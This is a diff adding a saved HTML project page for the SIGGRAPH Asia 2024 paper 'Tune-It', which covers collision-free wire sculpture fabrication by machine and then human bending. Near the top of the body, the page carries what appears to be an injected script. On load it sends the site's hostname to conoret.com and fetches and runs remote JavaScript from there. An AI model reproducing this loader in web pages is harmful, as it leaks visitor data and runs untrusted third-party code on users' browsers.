@@ -1,1 +1,517 @@
-Tune-It: Optimizing Wire Reconfiguration for Sculpture Manufacturing(to appear) 2024
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+
+    <title>
+        Tune-It: Optimizing Wire Reconfiguration for Sculpture Manufacturing
+    </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="./files/bootstrap.min.css">
+    <script src="./files/jquery.min.js.download"></script>
+    <script src="./files/bootstrap.min.js.download"></script>
+    <link rel="stylesheet" type="text/css" href="./files/style.css" media="screen">
+    <link rel="stylesheet" type="text/css" href="./files/orbit-1.2.3.css" media="screen">
+    <link rel="stylesheet" type="text/css" href="./files/jquery.fancybox-1.3.4.css" media="screen">
+    <!--[if lt IE 9]><script type="text/javascript" src="assets/scripts/modernizr.js"></script><![endif]-->
+    <style type="text/css">
+        #lb_infobar_3436182992 {
+            color: #000000 !important;
+            font-weight: normal !important;
+            text-decoration: none !important;
+            margin-top: 0 !important;
+            margin-bottom: 0 !important;
+            margin-left: 0 !important;
+            margin-right: 0 !important;
+            padding-top: 0 !important;
+            padding-bottom: 0 !important;
+            padding-left: 0 !important;
+            padding-right: 0 !important;
+            float: none !important;
+            text-align: left !important;
+            height: 37px !important;
+            width: 100% !important;
+            background-color: #F5F5F5 !important;
+            background-image: -webkit-linear-gradient(top, #F5F5F5, #EEEDED) !important;
+            border-bottom: 1px solid #C0C0C0 !important;
+            box-shadow: inset 0 1px 1px 1px #FFFFFF !important;
+            line-height: 36px !important;
+            font-family: '微软雅黑', '宋体' !important;
+            z-index: 9999999999 !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            position: fixed !important;
+            top: 0px !important;
+            left: 0px !important;
+        }
+
+            #lb_infobar_3436182992,
+            #lb_infobar_3436182992 * {
+                border-radius: 0 !important;
+                padding: 0 !important;
+                margin: 0 !important;
+            }
+
+                #lb_infobar_3436182992 * {
+                    width: auto !important;
+                    background: none !important;
+                }
+
+                #lb_infobar_3436182992 input {
+                    border-radius: 4px !important;
+                    box-shadow: 0 1px 2px rgba(0, 0, 0, .15) !important;
+                    font-family: '微软雅黑,', '宋体' !important;
+                    font-size: 12px !important;
+                    font-weight: normal !important;
+                    text-shadow: none !important;
+                    margin: 0 0 0 18px !important;
+                    padding: 0 !important;
+                }
+
+        #lb_infobar_translate_3436182992 {
+            background-color: #FBB016 !important;
+            background-image: -webkit-linear-gradient(top, #FBB016, #ED8A0D) !important;
+            width: 78px !important;
+            height: 26px !important;
+            border: 1px solid #E19D3C !important;
+            color: #FFFFFF !important;
+            cursor: pointer !important;
+            line-height: normal !important;
+            vertical-align: middle !important;
+        }
+
+            #lb_infobar_translate_3436182992:hover {
+                background-color: #FDBF3F !important;
+                background-image: -webkit-linear-gradient(top, #FDBF3F, #ED8A0D) !important;
+            }
+
+            #lb_infobar_translate_3436182992:active {
+                background-color: #ED8A0D !important;
+                background-image: -webkit-linear-gradient(top, #ED8A0D, #FBB016) !important;
+            }
+
+        #lb_infobar_words_3436182992 {
+            background-color: #FBB016 !important;
+            background-image: -webkit-linear-gradient(top, #FBB016, #ED8A0D) !important;
+            width: 90px !important;
+            height: 26px !important;
+            border: 1px solid #E19D3C !important;
+            color: #FFFFFF !important;
+            cursor: pointer !important;
+            line-height: normal !important;
+            vertical-align: middle !important;
+            left: 360px !important;
+        }
+
+            #lb_infobar_words_3436182992:hover {
+                background-color: #FDBF3F !important;
+                background-image: -webkit-linear-gradient(top, #FDBF3F, #ED8A0D) !important;
+            }
+
+            #lb_infobar_words_3436182992:active {
+                background-color: #ED8A0D !important;
+                background-image: -webkit-linear-gradient(top, #ED8A0D, #FBB016) !important;
+            }
+
+        #lb_infobar_return_3436182992 {
+            background-color: #FFFFFF !important;
+            background-image: -webkit-linear-gradient(top, #FFFFFF, #E0DFDF) !important;
+            width: 78px !important;
+            height: 26px !important;
+            border: 1px solid #B0AFAF !important;
+            color: rgba(0, 0, 0, .5) !important;
+            cursor: pointer !important;
+            line-height: normal !important;
+            vertical-align: middle !important;
+        }
+
+            #lb_infobar_return_3436182992.lb_infobar_return_words_3436182992 {
+                width: 130px !important;
+            }
+
+            #lb_infobar_return_3436182992:hover {
+                background-color: #EDECEC !important;
+                background-image: -webkit-linear-gradient(top, #FFFFFF, #EDECEC) !important;
+            }
+
+            #lb_infobar_return_3436182992:active {
+                background-color: #E0DFDF !important;
+                background-image: -webkit-linear-gradient(top, #E0DFDF, #FFFFFF) !important;
+            }
+
+        #lb_infobar_3436182992 a {
+            text-decoration: underline !important;
+            font-size: 12px !important;
+            color: #999999 !important;
+            cursor: pointer !important;
+        }
+
+            #lb_infobar_3436182992 a:hover {
+                color: #FC9500 !important;
+            }
+
+            #lb_infobar_3436182992 a:active {
+                color: #D68003 !important;
+            }
+
+        #lb_infobar_close_3436182992 {
+            background-position: -66px -27px !important;
+            cursor: pointer !important;
+            position: absolute !important;
+            top: 0 !important;
+            right: 1em !important;
+            line-height: 36px !important;
+        }
+
+            #lb_infobar_close_3436182992:hover {
+                background-position: -66px -41px !important;
+            }
+
+            #lb_infobar_close_3436182992:active {
+                background-position: -66px -54px !important;
+            }
+
+        #lb_infobar_notice_3436182992 {
+            line-height: 36px !important;
+            margin-left: 55px !important;
+            font-size: 14px !important;
+            vertical-align: middle !important;
+        }
+
+        #lb_infobar_powered_3436182992 {
+            padding-left: 18px !important;
+            font-size: 10px !important;
+            color: #979797 !important;
+            font-family: 'Arial' !important;
+            font-style: italic !important;
+        }
+
+        #lb_infobar_ignore_3436182992 {
+            line-height: 36px !important;
+            margin-right: 3em !important;
+            position: absolute !important;
+            top: 0 !important;
+            right: 0 !important;
+        }
+
+        #lb_infobar_manual_3436182992 {
+            line-height: 36px !important;
+            margin-right: 12em !important;
+            position: absolute !important;
+            top: 0 !important;
+            right: 0 !important;
+        }
+
+        #lb_infobar_icon_3436182992 {
+            position: absolute !important;
+            top: 0 !important;
+            left: 0 !important;
+            height: 37px !important;
+            width: 42px !important;
+            color: #fff !important;
+            font-size: 24px !important;
+            text-align: center !important;
+            background-repeat: no-repeat !important;
+            background-position: -80px 0 !important;
+        }
+
+        #lb_infobar_translate_3436182992.lb_infobar_btn_inactive_3436182992,
+        #lb_infobar_words_3436182992.lb_infobar_btn_inactive_3436182992 {
+            background-color: #FFFFFF !important;
+            background-image: -webkit-linear-gradient(top, #FFFFFF, #E0DFDF) !important;
+            border: 1px solid #B0AFAF !important;
+            color: #808080 !important;
+        }
+
+            #lb_infobar_translate_3436182992.lb_infobar_btn_inactive_3436182992:hover,
+            #lb_infobar_words_3436182992.lb_infobar_btn_inactive_3436182992:hover {
+                background-color: #EDECEC !important;
+                background-image: -webkit-linear-gradient(top, #FFFFFF, #EDECEC) !important;
+            }
+
+            #lb_infobar_translate_3436182992.lb_infobar_btn_inactive_3436182992:hover,
+            #lb_infobar_words_3436182992.lb_infobar_btn_inactive_3436182992:active {
+                background-color: #E0DFDF !important;
+                background-image: -webkit-linear-gradient(top, #E0DFDF, #FFFFFF) !important;
+            }
+
+        #lb_infobar_hover_3436182992:before {
+            content: " " !important;
+            position: absolute !important;
+            border: 5px solid transparent !important;
+            border-top: 5px solid #000 !important;
+            bottom: -10px !important;
+            left: 50% !important;
+        }
+
+        #lb_infobar_hover_3436182992:after {
+            content: " " !important;
+            position: absolute !important;
+            border: 5px solid transparent !important;
+            border-top: 5px solid #fff !important;
+            bottom: -9px !important;
+            left: 50% !important;
+        }
+
+        #lb_infobar_hover_3436182992 {
+            line-height: 1.2 !important;
+            font-size: 12px !important;
+            min-width: 150px !important;
+            position: fixed !important;
+            background: #fff !important;
+            border: 1px solid #333 !important;
+            border-radius: 3px !important;
+            padding: 10px !important;
+            color: #333 !important;
+            z-index: 9999999999 !important;
+        }
+
+            #lb_infobar_hover_3436182992.lb_infobar_hover_below:before {
+                content: " " !important;
+                position: absolute !important;
+                border: 5px solid transparent !important;
+                border-bottom: 5px solid #000 !important;
+                top: -10px !important;
+                left: 50% !important;
+                bottom: auto !important;
+            }
+
+            #lb_infobar_hover_3436182992.lb_infobar_hover_below:after {
+                content: " " !important;
+                position: absolute !important;
+                border: 5px solid transparent !important;
+                border-bottom: 5px solid #fff !important;
+                top: -9px !important;
+                left: 50% !important;
+                bottom: auto !important;
+            }
+    </style>
+    <script src="./files/dsp" type="text/javascript" defer="" async=""></script>
+</head>
+
+<body style="margin-top: 38px !important; position: relative !important;">
+    <script type="text/javascript">window.top === window && !function () { var e = document.createElement("script"), t = document.getElementsByTagName("head")[0]; e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random(), e.type = "text/javascript", e.defer = !0, e.async = !0, t.appendChild(e) }();</script>
+
+    <div class="wrapper">
+        <header>
+            <br>
+            <br>
+            <h1>Tune-It: Optimizing Wire Reconfiguration for Sculpture Manufacturing</h1>
+            <br>
+		<br>
+            <p class="session">ACM SIGGRAPH Asia 2024 (conference track)</p>
+            <br>
+            <p class="author">
+                <a href="https://qibingwu.github.io/" target="_blank">Qibing Wu</a><sup>1#</sup>&nbsp;&nbsp;
+                <a href="" target="_blank">Zhihao Zhang</a><sup>1#</sup>&nbsp;&nbsp;            
+                <a href="https://ringednebulae.github.io/personal-webpage/" target="_blank">Xin Yan</a><sup>1</sup>&nbsp;&nbsp;
+                <a href="https://fanchao98.github.io/" target="_blank">Fanchao Zhong</a><sup>1</sup>&nbsp;&nbsp;
+                <a href="" target="_blank">Yueze Zhu</a><sup>2</sup>&nbsp;&nbsp;
+				<a href="" target="_blank">Xurong Lu</a><sup>1</sup>&nbsp;&nbsp; 
+				<a href="" target="_blank">Runze Xue</a><sup>1</sup>&nbsp;&nbsp; 
+				<a href="" target="_blank">Rui Li</a><sup>1</sup>&nbsp;&nbsp; 
+		     <br>
+		    <br>
+				<a href="https://irc.cs.sdu.edu.cn/~chtu/index.html" target="_blank">Changhe Tu</a><sup>1</sup>&nbsp;&nbsp;
+                <a href="https://haisenzhao.github.io/" target="_blank">Haisen Zhao</a><sup>1*</sup>&nbsp;&nbsp;
+            </p>
+            <br>
+		<br>
+            <p class="author">
+                <sup>1</sup><a href="http://en.sdu.edu.cn/" target="_blank">Shandong University</a>&nbsp;&nbsp;
+                <sup>2</sup><a href="https://www.ucl.ac.uk/" target="_blank">University College London</a>&nbsp;&nbsp;
+            </p>
+
+
+            <br>
+        </header>
+
+        <section id="home">
+            <div class="row" style="text-align:center;">
+                <img src="./files/teaser.jpg" height="170" alt="">
+            </div>
+            <center>
+                <p>
+                    We introduce a novel computational framework for wire sculpture
+					fabrication that seamlessly integrates the strengths of wire-bending machines and human craftsmanship. 
+					The input wire (top of (a)) is fitted into a segment-bendable wire 
+					(bottom of (a)) with bending fabricable line segments and circular segments (indicated in different colors), considering the manufacturing constraints of wire-bending machine. 
+					For collision-free wire bending, we generate a tuned wire in which tuned points are indicated with red dots (b). 
+					The manufacturing result 
+					after the machine-bending stage with our DIY bending machine (c). The final result after the human-bending stage by a non-skilled participant (d).
+                </p>
+            </center>
+            <p><span><o:p>&nbsp;</o:p></span></p>
+        </section>
+
+
+        <section id="abstract">
+            <h3 class="title">Abstract</h3> <br>
+            <div class="row">
+                <p>
+                    <span class="dropcap">W</span>ire sculptures are important in both industrial applications and daily life.
+					We introduce a novel fabrication strategy for wire sculptures with complex geometries by tuning the target shape to a collision-free shape for the wire-bending machine and then bending it back to the target by a human.
+					The key challenge lies in tuning the least number of bending points, which is formulated as an "Optimizing Wire Reconfiguration" problem.
+					We first fit the input target wire with consecutive line segments and circular segments to ensure the bending manufacturing constraints for each segment, then generate tuned wire through a bilevel optimization. This involves selecting the bending points at the upper level with a beam search strategy and determining the specifically tuned angles at the lower level.
+					We perform a thorough physical evaluation using a DIY wire-bending machine. The results show the effectiveness of our proposed approach in realizing a wide range of intricate and complex wire sculptures.
+                </p>
+                <br><br>
+            </div>
+            <div class="row">
+
+
+            </div>
+        </section>
+
+       <section id="vid">
+            <h3 class="title">Video</h3><br>
+            <div style="text-align:center;">
+                <iframe width="800" height="450" src="./files/Tune-It.mp4" title="Video" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+            </div>
+            <p>
+                <span>
+                    <o:p>&nbsp;</o:p>
+                </span>
+            </p><br><br>
+
+
+        </section>
+
+        <section id="vid">
+            <h3 class="title"> Algorithm overview</h3><br>
+            <!-- <div style="text-align:center;"> -->
+                <!-- <img src="./files/overview.png" width="900" alt=""> -->
+            <!-- </div> -->
+            <p>
+                In this paper, we present a fully automatic computational framework to make problem OWR tractable which enables us to generate a collision-free tuned wire, with as few uned points as possible.
+				First, fit the input wire into a set of fabricable bending segments, such as 3D line segments and circular segments, 
+				so that the fitted line segments and circular segments meet the bending manufacturing constraints.
+				Second, generate tuned wire through bilevel optimization, where the upper-level optimization 
+				focuses on selecting the bending points to be tuned, while the lower-level optimization aims at determining the tuned angles with the consideration of eliminating all collisions.
+				Moreover, we explore a weighted beam search strategy to trade off search efficiency and solution quality.
+				Finally, we validated our algorithm by conducting experiments on 3D models and fabricating a set of 2D models using a DIY bending machine.
+
+            </p>
+            <br><br>
+        </section>
+
+
+        <section id="vid">
+            <h3 class="title">More tuned results</h3><br>
+            
+			
+			<div style="text-align:center;">
+                <img src="./files/gallery.jpg" width="900" alt="">
+            </div>
+            <p>
+                Results gallery generated by our algorithm. 
+				The models are arranged in the order of <i>Bird</i>, <i>Bull</i>, <i>Cat</i>, <i>Dolphin</i>, <i>Leaf</i>, <i>Ma</i> (i.e. the simplified Chinese character of horse), <i>Woman</i>.  
+				We show both the fitting result (line segment: Green, circular segment: Yellow) and the deformed wire after bending the tuned points.
+            </p>
+			
+			<div style="text-align:center;">
+                <img src="./files/more-result-2d.jpg" width="900" alt="">
+            </div>
+            <p>
+                Thirteen results of 2D wire art examples.
+				The models are arranged in the order of <i>Man</i>, <i>Runner</i>, <i>Hat woman</i>, <i>Side face woman</i>, 
+				<i>Writing</i>, <i>Game player</i>, <i>Tree</i>, <i>Car</i>, <i>Guitar</i>, <i>Flower</i>, <i>Cake</i>, <i>World map</i>, <i>Rabbit</i>. 
+				We show both the fitting result (line segment: Green, circular segment: Yellow) and the tuned wire.
+            </p>
+			
+			<div style="text-align:center;">
+				<img src="./files/multi-view2.jpg" width="900" alt="">
+            </div>
+            <p>
+                Results of multi-view wire arts generated by <i>Tojo2024Wireart</i>. Top-left: View 1. Top-right: View 2. Bottom: tuned wire. 
+				The models are arranged in the order of <i>Cat-dog</i>, <i>Einstein-Newton</i>, <i>Elephant-giraffe</i>, <i>Bull-horse</i>, <i>Tree-flower</i>.
+            </p>
+			
+			
+			
+            <br>
+			
+			
+
+
+        </section>
+
+
+        <section id="vid">
+            <h3 class="title">Fabrication results</h3><br>
+            <div style="text-align:center;">
+                <img src="./files/gallery-fab.jpg" width="900" alt="">
+            </div>
+            <p>
+                Results gallery generated by our Machine-And-Then-Human-Bending strategy. 
+				The models are arranged in the order of <i>Bird</i>, <i>Woman</i>, <i>Cat</i>, <i>Ma</i> (i.e. the simplified Chinese character of horse), <i>Leaf</i>, <i>Dolphin</i>, <i>Bull</i>. 
+				Each set of images includes photos of the machine bending completed (golden) and the human bending completed (golden). 
+				The small image (white) in the corner of each photo is the theoretical rendering of that image. 
+				These photos use the maximum filter with parameter 2.8 for visualization, but the process does not change any shape.
+            </p>
+            <br>
+        </section>
+
+
+        <section id="vid">
+            <h3 class="title">Our wire bending machine</h3><br>
+            <div style="text-align:center;">
+                <img src="./files/machine.png" width="600" alt="">
+            </div>
+            <p>
+                
+				Our DIY wire bending machine, based on <a href="https://howtomechatronics.com/projects/arduino-3d-wire-bending-machine/" target="_blank">tutorial</a>, consists of straighteners, a wire feeder, a bending head with bending pin, and pedestal. 
+				The rotation center of the bending pin is aligned with the wire outlet.
+				The DuPont wires in the picture connect the motors and drivers.
+            </p>
+            <br>
+        </section>
+
+
+        <section id="downloads">
+            <h3 class="title">Downloads</h3>
+            <div class="row">
+                <p>
+                    <span>
+                        <o:p>&nbsp;</o:p>
+                    </span>
+                </p>
+                <table align="center" border="0" class="list">
+                    <tbody>
+                        <tr>
+                            <td width="100" align="center"><a href="./files/Tune-It.pdf"> <img width="80" id="_x0000_i10320" src="./files/paperpic.png" alt="1"></a></td>
+                            <!-- <td width="100" align="center"><a href="./files/VASCO ASHM equipment modification instructions.pdf"> <img width="80" id="_x0000_i10321" src="./files/paperpic.png" alt="1"></a></td> -->
+                            <td width="100" align="center"><a href="./files/Tune-It_SuppMate.pdf"> <img width="80" id="_x0000_i10321" src="./files/paperpic.png" alt="1"></a></td>
+                        </tr>
+
+                        <tr>
+                            <td width="180" align="center"><a href="./files/Tune-It.pdf"> Paper</a></td>
+                            <!-- <td width="180" align="center"><a href="./files/VASCO ASHM equipment modification instructions.pdf"> Our ASHM equipment modification instructions</a></td> -->
+                            <td width="180" align="center"><a href="./files/Tune-It_SuppMate.pdf"> Supplementary Materials
+</a></td>
+                        </tr>
+
+
+                    </tbody>
+                </table>
+                <br>
+
+            </div>
+
+            <p>
+                <span>
+                    <o:p>&nbsp;</o:p>
+                </span>
+            </p>
+        </section>
+
+
+
+        <footer></footer>
+    </div>
+
+
+</body>
+</html>
